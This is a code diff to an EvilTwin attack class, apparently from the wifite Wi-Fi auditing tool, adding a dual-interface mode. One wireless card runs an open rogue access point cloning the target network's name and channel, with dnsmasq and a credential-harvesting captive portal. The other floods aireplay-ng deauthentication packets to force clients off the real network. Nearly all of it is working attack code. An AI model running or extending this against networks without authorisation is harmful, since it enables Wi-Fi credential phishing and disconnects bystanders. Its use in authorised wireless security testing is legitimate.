@@ -63,6 +63,9 @@ class EvilTwin(Attack):
         """
         super().__init__(target)
         
+        # Interface assignment for dual interface support
+        self.interface_assignment = None
+        
         self.interface_ap = interface_ap or Configuration.interface
         self.interface_deauth = interface_deauth or Configuration.interface
         
@@ -139,6 +142,458 @@ class EvilTwin(Attack):
         self.session_manager = session_manager
         self.session = session
         log_debug('EvilTwin', 'Session manager attached for state persistence')
+    
+    def _get_interface_assignment(self):
+        """
+        Get interface assignment for Evil Twin attack.
+        
+        Retrieves interface assignment from wifite instance or configuration,
+        validates it for Evil Twin attack requirements, and returns the assignment.
+        
+        Returns:
+            InterfaceAssignment object or None if not available/invalid
+        """
+        from ..util.interface_assignment import InterfaceAssignmentStrategy
+        from ..util.interface_manager import InterfaceManager
+        
+        try:
+            # Check if manual interfaces are specified in configuration
+            if Configuration.interface_primary and Configuration.interface_secondary:
+                log_info('EvilTwin', 'Using manually specified interfaces')
+                
+                # Get interface info for validation
+                available_interfaces = InterfaceManager.get_available_interfaces()
+                primary_info = next((iface for iface in available_interfaces 
+                                   if iface.name == Configuration.interface_primary), None)
+                secondary_info = next((iface for iface in available_interfaces 
+                                     if iface.name == Configuration.interface_secondary), None)
+                
+                if not primary_info:
+                    log_error('EvilTwin', f'Primary interface {Configuration.interface_primary} not found')
+                    return None
+                
+                if not secondary_info:
+                    log_error('EvilTwin', f'Secondary interface {Configuration.interface_secondary} not found')
+                    return None
+                
+                # Validate the manual assignment
+                is_valid, error_msg = InterfaceAssignmentStrategy.validate_dual_interface_setup(
+                    primary_info, secondary_info
+                )
+                
+                if not is_valid:
+                    log_error('EvilTwin', f'Manual interface assignment invalid: {error_msg}')
+                    return None
+                
+                # Create assignment from manual configuration
+                from ..model.interface_assignment import InterfaceAssignment
+                assignment = InterfaceAssignment(
+                    attack_type='evil_twin',
+                    primary=Configuration.interface_primary,
+                    secondary=Configuration.interface_secondary,
+                    primary_role='Rogue AP (hostapd)',
+                    secondary_role='Deauthentication (aireplay-ng)'
+                )
+                
+                log_info('EvilTwin', f'Manual assignment validated: {assignment.get_assignment_summary()}')
+                return assignment
+            
+            # Check if assignment is already available (from wifite instance)
+            # This would be set by the main wifite flow
+            if self.interface_assignment:
+                log_info('EvilTwin', 'Using existing interface assignment')
+                return self.interface_assignment
+            
+            # Try to get assignment from wifite instance if available
+            # This is a fallback for when the attack is run directly
+            try:
+                from ..wifite import Wifite
+                # Note: This is a fallback and may not always work
+                # The preferred approach is to set interface_assignment before calling run()
+                log_debug('EvilTwin', 'No interface assignment available, will use single interface mode')
+            except:
+                pass
+            
+            return None
+            
+        except Exception as e:
+            log_error('EvilTwin', f'Error getting interface assignment: {e}', e)
+            return None
+    
+    def _run_dual_interface(self) -> bool:
+        """
+        Run Evil Twin attack with two interfaces (no mode switching required).
+        
+        This method implements the dual interface attack flow:
+        1. Configure primary interface in AP mode
+        2. Configure secondary interface in monitor mode
+        3. Start rogue AP on primary interface (continuous operation)
+        4. Start deauth on secondary interface (parallel operation)
+        5. Monitor for clients and credentials
+        
+        Returns:
+            True if credentials were captured, False otherwise
+        """
+        try:
+            log_info('EvilTwin', 'Running Evil Twin in dual interface mode')
+            
+            # Extract interfaces from assignment
+            self.interface_ap = self.interface_assignment.primary
+            self.interface_deauth = self.interface_assignment.secondary
+            
+            log_info('EvilTwin', f'AP interface: {self.interface_ap}')
+            log_info('EvilTwin', f'Deauth interface: {self.interface_deauth}')
+            
+            if self.attack_view:
+                self.attack_view.add_log(f"Dual interface mode: AP={self.interface_ap}, Deauth={self.interface_deauth}", timestamp=True)
+            
+            # Configure AP interface (bring down, set to managed mode for hostapd)
+            Color.pl('{+} {C}Configuring AP interface {G}%s{W}...' % self.interface_ap)
+            log_info('EvilTwin', f'Configuring AP interface {self.interface_ap}')
+            
+            if not self._configure_ap_interface(self.interface_ap):
+                self.error_message = f'Failed to configure AP interface {self.interface_ap}'
+                return False
+            
+            # Configure deauth interface (monitor mode)
+            Color.pl('{+} {C}Configuring deauth interface {G}%s{W}...' % self.interface_deauth)
+            log_info('EvilTwin', f'Configuring deauth interface {self.interface_deauth}')
+            
+            if not self._configure_deauth_interface(self.interface_deauth):
+                self.error_message = f'Failed to configure deauth interface {self.interface_deauth}'
+                return False
+            
+            # Start rogue AP on primary interface
+            Color.pl('{+} {C}Starting rogue AP on {G}%s{W}...' % self.interface_ap)
+            self.state = AttackState.STARTING_AP
+            
+            if self.attack_view:
+                self.attack_view.add_log(f"Starting rogue AP on {self.interface_ap}...", timestamp=True)
+            
+            if not self._start_rogue_ap_dual(self.interface_ap):
+                self.error_message = 'Failed to start rogue AP'
+                return False
+            
+            # Start network services (dnsmasq, captive portal)
+            Color.pl('{+} {C}Starting network services...{W}')
+            self.state = AttackState.STARTING_SERVICES
+            
+            if self.attack_view:
+                self.attack_view.add_log("Starting network services...", timestamp=True)
+            
+            if not self._start_network_services_dual():
+                self.error_message = 'Failed to start network services'
+                return False
+            
+            # Start deauth on secondary interface (non-blocking, parallel)
+            Color.pl('{+} {C}Starting deauth on {G}%s{W}...' % self.interface_deauth)
+            self.state = AttackState.STARTING_DEAUTH
+            
+            if self.attack_view:
+                self.attack_view.add_log(f"Starting deauth on {self.interface_deauth}...", timestamp=True)
+            
+            if not self._start_deauth_dual(self.interface_deauth):
+                log_warning('EvilTwin', 'Failed to start deauth, continuing anyway')
+                # Don't fail the attack if deauth fails, it's not critical
+            
+            # Monitor attack progress
+            Color.pl('{+} {G}Dual interface Evil Twin attack running{W}')
+            Color.pl('{+} {C}AP:{W} {G}%s{W} | {C}Deauth:{W} {G}%s{W}' % (
+                self.interface_ap, self.interface_deauth))
+            Color.pl('{+} {C}No mode switching required - both interfaces operating in parallel{W}')
+            Color.pl('')
+            
+            if self.attack_view:
+                self.attack_view.add_log("Dual interface attack running - no mode switching required", timestamp=True)
+            
+            self.state = AttackState.RUNNING
+            
+            # Main monitoring loop (same as single interface)
+            return self._monitor_attack_loop()
+            
+        except Exception as e:
+            log_error('EvilTwin', f'Dual interface attack failed: {e}', e)
+            self.error_message = f'Dual interface attack failed: {e}'
+            return False
+    
+    def _configure_ap_interface(self, interface: str) -> bool:
+        """
+        Configure interface for AP mode operation.
+        
+        Args:
+            interface: Interface name to configure
+            
+        Returns:
+            True if successful, False otherwise
+        """
+        try:
+            from ..tools.airmon import Airmon
+            
+            # Bring interface down
+            log_debug('EvilTwin', f'Bringing down interface {interface}')
+            Airmon.put_interface_down(interface)
+            
+            # Set to managed mode (hostapd will handle AP mode)
+            log_debug('EvilTwin', f'Setting {interface} to managed mode')
+            Airmon.set_interface_mode(interface, 'managed')
+            
+            # Bring interface up
+            log_debug('EvilTwin', f'Bringing up interface {interface}')
+            Airmon.put_interface_up(interface)
+            
+            log_info('EvilTwin', f'AP interface {interface} configured successfully')
+            return True
+            
+        except Exception as e:
+            log_error('EvilTwin', f'Failed to configure AP interface {interface}: {e}', e)
+            return False
+    
+    def _configure_deauth_interface(self, interface: str) -> bool:
+        """
+        Configure interface for deauth operation (monitor mode).
+        
+        Args:
+            interface: Interface name to configure
+            
+        Returns:
+            True if successful, False otherwise
+        """
+        try:
+            from ..tools.airmon import Airmon
+            
+            # Put interface in monitor mode
+            log_debug('EvilTwin', f'Putting {interface} in monitor mode')
+            monitor_interface = Airmon.start(interface)
+            
+            if not monitor_interface:
+                log_error('EvilTwin', f'Failed to put {interface} in monitor mode')
+                return False
+            
+            # Update interface name if it changed (e.g., wlan0 -> wlan0mon)
+            if monitor_interface != interface:
+                log_info('EvilTwin', f'Deauth interface renamed: {interface} -> {monitor_interface}')
+                self.interface_deauth = monitor_interface
+            
+            # Set channel to match target
+            if hasattr(self.target, 'channel') and self.target.channel:
+                log_debug('EvilTwin', f'Setting {self.interface_deauth} to channel {self.target.channel}')
+                Airmon.set_interface_channel(self.interface_deauth, self.target.channel)
+            
+            log_info('EvilTwin', f'Deauth interface {self.interface_deauth} configured successfully')
+            return True
+            
+        except Exception as e:
+            log_error('EvilTwin', f'Failed to configure deauth interface {interface}: {e}', e)
+            return False
+    
+    def _start_rogue_ap_dual(self, interface: str) -> bool:
+        """
+        Start rogue AP on dedicated AP interface (dual interface mode).
+        
+        This method configures and starts hostapd on the specified interface.
+        The interface should already be configured in managed mode by
+        _configure_ap_interface() before calling this method.
+        
+        Args:
+            interface: Interface to use for AP (must support AP mode)
+            
+        Returns:
+            True if successful, False otherwise
+        """
+        try:
+            from ..tools.hostapd import Hostapd
+            
+            log_info('EvilTwin', f'Starting hostapd on dedicated AP interface: {interface}')
+            
+            # Verify interface is ready for AP mode
+            if not Hostapd.check_ap_mode_support(interface):
+                log_error('EvilTwin', f'Interface {interface} does not support AP mode')
+                Color.pl('{!} {R}Interface {O}%s{R} does not support AP mode{W}' % interface)
+                return False
+            
+            # Create hostapd instance with dedicated AP interface
+            self.hostapd = Hostapd(
+                interface=interface,
+                ssid=self.target.essid,
+                channel=self.target.channel,
+                password=None  # Open network for captive portal
+            )
+            
+            # Start hostapd on the dedicated AP interface
+            if not self.hostapd.start():
+                log_error('EvilTwin', f'Failed to start hostapd on {interface}')
+                Color.pl('{!} {R}Failed to start hostapd on {O}%s{W}' % interface)
+                return False
+            
+            # Verify hostapd is running
+            if not self.hostapd.is_running():
+                log_error('EvilTwin', f'Hostapd started but is not running on {interface}')
+                return False
+            
+            log_info('EvilTwin', f'Rogue AP started successfully on {interface}')
+            Color.pl('{+} {G}Rogue AP running on {C}%s{W}' % interface)
+            
+            # Register hostapd with cleanup manager
+            self.cleanup_manager.register_process(self.hostapd, 'hostapd')
+            
+            return True
+            
+        except Exception as e:
+            log_error('EvilTwin', f'Failed to start rogue AP on {interface}: {e}', e)
+            Color.pl('{!} {R}Failed to start rogue AP:{W} %s' % str(e))
+            return False
+    
+    def _start_network_services_dual(self) -> bool:
+        """
+        Start network services (dnsmasq, captive portal) for dual interface mode.
+        
+        Returns:
+            True if successful, False otherwise
+        """
+        try:
+            from ..tools.dnsmasq import Dnsmasq
+            from ..attack.portal.server import PortalServer
+            
+            # Start dnsmasq for DHCP/DNS
+            self.dnsmasq = Dnsmasq(
+                interface=self.interface_ap,
+                gateway_ip='192.168.100.1',
+                dhcp_range_start='192.168.100.10',
+                dhcp_range_end='192.168.100.100'
+            )
+            
+            if not self.dnsmasq.start():
+                log_error('EvilTwin', 'Failed to start dnsmasq')
+                return False
+            
+            log_info('EvilTwin', 'Dnsmasq started successfully')
+            
+            # Start captive portal
+            portal_template = getattr(Configuration, 'eviltwin_template', 'generic')
+            portal_port = getattr(Configuration, 'eviltwin_port', 80)
+            
+            self.portal_server = PortalServer(
+                target=self.target,
+                template=portal_template,
+                port=portal_port
+            )
+            
+            if not self.portal_server.start():
+                log_error('EvilTwin', 'Failed to start captive portal')
+                return False
+            
+            log_info('EvilTwin', f'Captive portal started on port {portal_port}')
+            return True
+            
+        except Exception as e:
+            log_error('EvilTwin', f'Failed to start network services: {e}', e)
+            return False
+    
+    def _start_deauth_dual(self, interface: str) -> bool:
+        """
+        Start deauth on dedicated deauth interface (dual interface mode).
+        
+        This method validates that the deauth interface is ready for sending
+        deauthentication packets. The actual deauth packets are sent by the
+        adaptive deauth manager in the main monitoring loop via _handle_deauth().
+        
+        In dual interface mode, deauth runs continuously in parallel with the
+        rogue AP without requiring mode switching.
+        
+        Args:
+            interface: Interface to use for deauth (must be in monitor mode)
+            
+        Returns:
+            True if successful, False otherwise
+        """
+        try:
+            log_info('EvilTwin', f'Preparing deauth on dedicated interface: {interface}')
+            
+            # Verify interface is in monitor mode
+            from ..tools.airmon import Airmon
+            mode = Airmon.get_interface_mode(interface)
+            
+            if mode != 'monitor':
+                log_warning('EvilTwin', f'Deauth interface {interface} is not in monitor mode (current: {mode})')
+                Color.pl('{!} {O}Warning: Deauth interface {C}%s{O} is not in monitor mode{W}' % interface)
+                # Don't fail - the interface might still work
+            
+            # Verify interface is on the correct channel
+            if hasattr(self.target, 'channel') and self.target.channel:
+                try:
+                    current_channel = Airmon.get_interface_channel(interface)
+                    if current_channel and current_channel != self.target.channel:
+                        log_warning('EvilTwin', f'Deauth interface on channel {current_channel}, target on {self.target.channel}')
+                        Color.pl('{!} {O}Warning: Channel mismatch - deauth may be less effective{W}')
+                except:
+                    pass
+            
+            # Deauth will be handled by the adaptive deauth manager
+            # in the main monitoring loop via _handle_deauth()
+            # This method just validates the interface is ready
+            
+            log_info('EvilTwin', f'Deauth interface {interface} ready for adaptive deauth')
+            Color.pl('{+} {G}Deauth interface {C}%s{G} ready{W}' % interface)
+            
+            return True
+            
+        except Exception as e:
+            log_error('EvilTwin', f'Failed to prepare deauth interface {interface}: {e}', e)
+            Color.pl('{!} {R}Failed to prepare deauth interface:{W} %s' % str(e))
+            return False
+    
+    def _monitor_attack_loop(self) -> bool:
+        """
+        Monitor attack progress and wait for credentials.
+        This is shared between dual and single interface modes.
+        
+        Returns:
+            True if credentials captured, False otherwise
+        """
+        try:
+            timeout = getattr(Configuration, 'evil_twin_timeout', 0)
+            last_session_save = time.time()
+            session_save_interval = 30
+            
+            while self.running and self.crack_result is None:
+                try:
+                    # Send deauth if needed
+                    self._handle_deauth()
+                    
+                    # Update status display
+                    self._update_status()
+                    
+                    # Save session periodically
+                    if time.time() - last_session_save >= session_save_interval:
+                        self._save_session_state()
+                        last_session_save = time.time()
+                    
+                    # Check timeout
+                    if timeout > 0 and (time.time() - self.start_time) >= timeout:
+                        Color.pl('\n{!} {O}Attack timeout reached{W}')
+                        log_info('EvilTwin', 'Attack timeout reached')
+                        break
+                    
+                    # Sleep briefly
+                    time.sleep(0.5)
+                    
+                except KeyboardInterrupt:
+                    Color.pl('\n{!} {O}Attack interrupted by user{W}')
+                    log_info('EvilTwin', 'Attack interrupted by user')
+                    break
+            
+            # Check if we got credentials
+            if self.crack_result:
+                self.success = True
+                self.state = AttackState.COMPLETED
+                return True
+            else:
+                self.state = AttackState.FAILED
+                return False
+                
+        except Exception as e:
+            log_error('EvilTwin', f'Monitoring loop failed: {e}', e)
+            return False
     
     def run(self) -> bool:
         """
@@ -222,7 +677,31 @@ class EvilTwin(Attack):
             if self.attack_view:
                 self.attack_view.add_log(f"Setup completed in {self.setup_time:.2f}s", timestamp=True)
             
-            # Start attack
+            # Check for dual interface mode
+            self.interface_assignment = self._get_interface_assignment()
+            
+            if self.interface_assignment and self.interface_assignment.is_dual_interface():
+                # Run in dual interface mode (no mode switching)
+                log_info('EvilTwin', 'Using dual interface mode')
+                Color.pl('{+} {G}Using dual interface mode{W}')
+                Color.pl('{+} {C}Primary (AP):{W} {G}%s{W}' % self.interface_assignment.primary)
+                Color.pl('{+} {C}Secondary (Deauth):{W} {G}%s{W}' % self.interface_assignment.secondary)
+                Color.pl('')
+                
+                if self.attack_view:
+                    self.attack_view.add_log("Using dual interface mode - no mode switching required", timestamp=True)
+                
+                return self._run_dual_interface()
+            else:
+                # Run in single interface mode (traditional with mode switching)
+                log_info('EvilTwin', 'Using single interface mode')
+                Color.pl('{+} {C}Using single interface mode{W}')
+                Color.pl('')
+                
+                if self.attack_view:
+                    self.attack_view.add_log("Using single interface mode", timestamp=True)
+            
+            # Start attack (single interface mode)
             Color.pl('{+} {G}Evil Twin attack started{W}')
             Color.pl('{+} {C}Rogue AP:{W} {G}%s{W} on channel {G}%s{W}' % (
                 self.target.essid, self.target.channel))
@@ -239,7 +718,7 @@ class EvilTwin(Attack):
             
             self.state = AttackState.RUNNING
             
-            # Main attack loop
+            # Main attack loop (single interface mode)
             timeout = getattr(Configuration, 'evil_twin_timeout', 0)
             last_session_save = time.time()
             session_save_interval = 30  # Save session every 30 seconds
@@ -700,7 +1179,12 @@ class EvilTwin(Attack):
     
     def _send_deauth(self, client_mac: str, count: int = 5):
         """
-        Send deauth packets to a client.
+        Send deauth packets to a client using the dedicated deauth interface.
+        
+        This method sends deauthentication packets from the dedicated deauth
+        interface (in monitor mode) to disconnect clients from the legitimate AP.
+        In dual interface mode, this runs in parallel with the rogue AP without
+        requiring mode switching.
         
         Args:
             client_mac: MAC address of client (or FF:FF:FF:FF:FF:FF for broadcast)
@@ -710,16 +1194,29 @@ class EvilTwin(Attack):
             from ..tools.aireplay import Aireplay
             from ..util.process import Process
             
-            # Build aireplay-ng command for deauth
+            # Verify deauth interface is available
+            if not self.interface_deauth:
+                log_warning('EvilTwin', 'No deauth interface configured')
+                return
+            
+            log_debug('EvilTwin', f'Sending {count} deauth packets to {client_mac} from {self.interface_deauth}')
+            
+            # Build aireplay-ng command for deauth using dedicated interface
             cmd = [
                 'aireplay-ng',
                 '--deauth', str(count),
-                '-a', self.target.bssid,
-                '-c', client_mac,
-                self.interface_deauth
+                '-a', self.target.bssid,  # Target AP BSSID
+                '-c', client_mac,          # Client MAC (or broadcast)
+                '--ignore-negative-one',   # Ignore negative one errors
+                '-D',                      # Skip AP detection
+                self.interface_deauth      # Use dedicated deauth interface
             ]
             
-            # Execute deauth (non-blocking)
+            # Add ESSID if available for better targeting
+            if hasattr(self.target, 'essid') and self.target.essid:
+                cmd.extend(['-e', self.target.essid])
+            
+            # Execute deauth (non-blocking) on dedicated deauth interface
             process = Process(cmd, devnull=True)
             
             # Wait briefly for deauth to complete
@@ -729,8 +1226,10 @@ class EvilTwin(Attack):
             if process.poll() is None:
                 process.interrupt()
             
+            log_debug('EvilTwin', f'Deauth sent successfully from {self.interface_deauth}')
+            
         except Exception as e:
-            log_warning('EvilTwin', f'Failed to send deauth: {e}')
+            log_warning('EvilTwin', f'Failed to send deauth from {self.interface_deauth}: {e}')
     
     def _update_status(self):
         """
